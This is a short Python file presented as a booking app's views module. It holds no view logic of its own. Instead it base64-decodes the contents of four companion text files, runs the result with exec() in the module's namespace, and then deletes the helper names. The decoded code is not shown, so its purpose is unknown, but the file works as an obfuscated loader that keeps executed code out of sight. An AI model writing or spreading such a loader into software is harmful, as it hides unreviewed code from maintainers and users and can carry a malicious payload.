# booking/views.py
import base64
from pathlib import Path
_dir = Path(__file__).resolve().parent
_code = b"".join(base64.b64decode((_dir / f"_vc_b64_{i}.txt").read_text().encode()) for i in range(4)).decode()
exec(compile(_code, __file__, "exec"), globals())
del base64, Path, _dir, _code
